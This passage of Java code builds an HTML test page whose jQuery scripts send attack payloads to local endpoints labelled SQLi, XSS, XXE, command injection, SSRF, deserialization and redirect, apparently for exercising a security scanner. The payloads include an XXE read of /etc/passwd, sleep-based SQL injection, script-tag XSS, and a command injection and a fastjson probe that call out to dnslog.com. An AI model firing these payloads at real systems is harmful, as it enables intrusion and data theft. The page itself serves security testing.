                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00062\", \"BS00062\", \"1d\", \"/xxe/BS00062\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xxe/BS00062',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00062=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE+test+[%3C!ELEMENT+test+ANY+%3E%3C!ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2F/etc//passwd%22+%3E]%3E%3Croot%3E%3Cname%3E%26xxe%3B%3C%2Fname%3E%3C%2Froot%3E',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00062\": \"BS00062\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00048\", \"BS00048\", \"1d\", \"/ssrf/BS00048\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/ssrf/BS00048',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00048\": \"BS00048\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00074\", \"BS00074\", \"1d\", \"/xss/BS00074\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                data = '<?xml version=\"1.0\" encoding=\"UTF-8\"?><root> <username>foo</username> <password>bar</password>' + '\\n' +' <BS00074>' + '\\n' +'&lt;script&gt;alert(1);&lt;/script&gt;</BS00074>' + '\\n' +' </root>';\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00074',\n" +
                "                    type: 'POST',\n" +
                "                    contentType : 'application/xml;charset=UTF-8',\n" +
                "                    data: data,\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00074\": \"BS00074\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00060\", \"BS00060\", \"1d\", \"/code_injection/BS00060\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/code_injection/BS00060',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00060=1%2b1',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00060\": \"BS00060\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" );
        sb.append(
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00128\", \"BS00128\", \"1d\", \"/sensitive/BS00128\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sensitive/BS00128',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00128\": \"BS00128\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00100\", \"BS00100\", \"1d\", \"/sqli/BS00100?BS00100=USERS%20WHERE%20SLEEP(10)\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00100?BS00100=USERS%20WHERE%20SLEEP(10)',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00100\": \"BS00100\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00113\", \"BS00113\", \"1d\", \"/sensitive/BS00114\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sensitive/BS00114',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00113\": \"BS00113\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00113\", \"BS00113\", \"1d\", \"/cmdi/BS00115\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cmdi/BS00115',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00115=123 %26%26 nslookup dnslog.com',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00113\": \"BS00113\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00101\", \"BS00101\", \"1d\", \"/sqli/BS00101?BS00101=sleep(10)%23\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00101?BS00101=sleep(10)%23',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00101\": \"BS00101\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00129\", \"BS00129\", \"1d\", \"/sensitive/BS00129\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sensitive/BS00129',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00129\": \"BS00129\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00061\", \"BS00061\", \"1d\", \"/xxe/BS00061\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xxe/BS00061',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00061=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE+test+[%3C!ELEMENT+test+ANY+%3E%3C!ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2F/etc//passwd%22+%3E]%3E%3Croot%3E%3Cname%3E%26xxe%3B%3C%2Fname%3E%3C%2Froot%3E',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00061\": \"BS00061\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00075\", \"BS00075\", \"1d\", \"/xss/BS00075\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00075',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00075=<script>alert(1);<\\/script>',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00075\": \"BS00075\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00049\", \"BS00049\", \"1d\", \"/ssrf/BS00049\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/ssrf/BS00049',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00049=https://www.taobao.com/',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00049\": \"BS00049\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00071\", \"BS00071\", \"1d\", \"/xss/BS00071\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00071',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00071=PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00071\": \"BS00071\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00065\", \"BS00065\", \"1d\", \"/sqli/BS00065\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00065',\n" +
                "                    type: 'POST',\n" +
                "                    data: \"BS00065=1' AND sleep(5)#\",\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00065\": \"BS00065\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" );
        sb.append(
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00059\", \"BS00059\", \"1d\", \"/code_injection/BS00059\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/code_injection/BS00059',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00059=1%2b1',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00059\": \"BS00059\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00105\", \"BS00105\", \"1d\", \"/sensitive/BS00105?BS00105=1\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sensitive/BS00105?BS00105=1',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00105\": \"BS00105\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00111\", \"BS00111\", \"1d\", \"/cors/BS00111\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cors/BS00111',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00111\": \"BS00111\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00139\", \"BS00139\", \"1d\", \"/xpath/BS00139\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xpath/BS00139',\n" +
                "                    type: 'POST',\n" +
                "                    data: \"username=admin&password=admim123'\",\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00139\": \"BS00139\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00138\", \"BS00138\", \"1d\", \"/ssrf/BS00138\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/ssrf/BS00138',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00138=file:////etc/passwd',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00138\": \"BS00138\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00108\", \"BS00108\", \"1d\", \"/ssrf/BS00110?BS00110=https://dnslog.com\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/ssrf/BS00110?BS00110=https://dnslog.com',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00108\": \"BS00108\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00104\", \"BS00104\", \"1d\", \"/sensitive/BS00104?BS00104\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sensitive/BS00104?BS00104',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00104\": \"BS00104\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00058\", \"BS00058\", \"1d\", \"/deserialization/BS00058\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/deserialization/BS00058',\n" +
                "                    type: 'POST',\n" +
                "                    contentType: 'application/json;charset=UTF-8',\n" +
                "                    data: '{\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog.com\"}',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00058\": \"BS00058\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00064\", \"BS00064\", \"1d\", \"/sqli/BS00064\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00064',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00064=YmFyJyBhbmQgJzEnPScw',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00064\": \"BS00064\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00070\", \"BS00070\", \"1d\", \"/sensitive/BS00070\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sensitive/BS00070',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'test=123',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00070\": \"BS00070\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00066\", \"BS00066\", \"1d\", \"/sqli/BS00066\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00066',\n" +
                "                    type: 'POST',\n" +
                "                    data: 'BS00066= 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00066\": \"BS00066\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00072\", \"BS00072\", \"1d\", \"/xss/BS00072\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/xss/BS00072',\n" +
                "                    type: 'POST',\n" +
                "                    contentType: 'application/json;charset=UTF-8',\n" +
                "                    data: '{\"BS00072\":\"<script>alert(1);<\\/script>\"}',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00072\": \"BS00072\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00099\", \"BS00099\", \"1d\", \"/sqli/BS00099?BS00099=%73%65%6c%65%63%74%20%73%6c%65%65%70%28%31%30%29\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/sqli/BS00099?BS00099=%73%65%6c%65%63%74%20%73%6c%65%65%70%28%31%30%29',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00099\": \"BS00099\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00112\", \"BS00112\", \"1d\", \"/cors/BS00112\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/cors/BS00112',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00112\": \"BS00112\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n");
        sb.append(
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00106\", \"BS00106\", \"1d\", \"/redirect/BS00106?BS00106=https://www.dnslog.com\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/redirect/BS00106?BS00106=https://www.dnslog.com',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00106\": \"BS00106\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
                "        addCookie(\"BS00107\", \"BS00107\", \"1d\", \"/redirect/BS00107?BS00107=https://www.dnslog.com\")\n" +
                "        $.extend(myAction, {\n" +
                "            test: function() {\n" +
                "                $.ajax({\n" +
                "                    url: '/redirect/BS00107?BS00107=https://www.dnslog.com',\n" +
                "                    type: 'GET',\n" +
                "                    data: '',\n" +
                "                    cache: false,\n" +
                "                    headers: {\"BS00107\": \"BS00107\"},                \n" +
                "                    success: function(res){\n" +
                "                        if (res.code === 200) {\n" +
                "                            \n" +
                "                        }   \n" +
                "                    },\n" +
                "                    error: function(e) {\n" +
                "\n" +
                "                    }\n" +
                "                });\n" +
                "            }\n" +
                "        });\n" +
                "\n" +
                "        var init = function() {\n" +
                "            myAction.test();\n" +
                "        }();\n" +
                "    })\n" +
                "    </script>\n" +
                "\n" +
                "\n" +
                "    <script type=\"text/javascript\">\n" +
                "    $(function() {\n" +
                "        var myAction = {};\n" +
